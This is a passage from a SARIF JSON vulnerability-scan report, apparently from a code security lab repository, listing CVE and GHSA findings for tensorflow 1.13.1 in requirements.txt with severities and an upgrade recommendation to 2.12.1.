            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41899 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41899](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41899)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b7db90b84dbf9c5a7d57b0180d1b4d4a8ab7fff7"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41891",
          "ruleIndex": 415,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41891 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41891](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41891)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a7b0ab534e14a8cac22aa4dfca3156ca38b7e50e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41908",
          "ruleIndex": 416,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41908 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41908](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41908)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "382fba57c5b1091e91d49be21508896d9e4fedb4"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41888",
          "ruleIndex": 417,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41888 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41888](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41888)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "beaa38d42be28aea5cf37d2f68e2cc861b637c73"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41886",
          "ruleIndex": 418,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41886 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41886](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41886)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "90c9b095877d88ac69688598ed986fb255cec134"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41901",
          "ruleIndex": 419,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41901 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41901](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41901)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e941fab49110ac82779d754eae58137f25c7cb35"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-cqvq-fvhr-v6hc",
          "ruleIndex": 420,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability GHSA-cqvq-fvhr-v6hc (severity: low, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [GHSA-cqvq-fvhr-v6hc](https://github.com/advisories/GHSA-cqvq-fvhr-v6hc)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "abe5436d5559fba67f2c3749fa2b83d42bfbad5d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41894",
          "ruleIndex": 421,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41894 (severity: high, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41894](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41894)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e331345b6647d340ee18c0c87053c60fa792e429"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41907",
          "ruleIndex": 422,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41907 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41907](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41907)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2f0efd7f2d5eba3ed50b8be22f4a6bcf58caf895"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41898",
          "ruleIndex": 423,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41898 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41898](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41898)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9d044337a58ad4338ee22fc6961254141a122972"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41895",
          "ruleIndex": 424,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41895 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41895](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41895)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3639a0045b45b122cd2b8974a8471867d08cbdd0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41889",
          "ruleIndex": 425,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41889 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41889](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41889)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1d94ec7801ff986c279855d84a29eeb376e89065"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41880",
          "ruleIndex": 426,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41880 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41880](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41880)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c9f563f1b67da645f0f3efedb8eecc2360c8dbbf"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41910",
          "ruleIndex": 427,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41910 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41910)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c42d89ef8de58c7457597220e0b6290e3aea573e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41902",
          "ruleIndex": 428,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41902 (severity: high, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41902](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41902)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3aab67b02b63905f41fe025d73c5f41494486a27"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41900",
          "ruleIndex": 429,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41900 (severity: high, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41900](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41900)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0caa84384e4aece90388c79f927a223b96138a2b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41887",
          "ruleIndex": 430,
          "level": "warning",
          "message": {
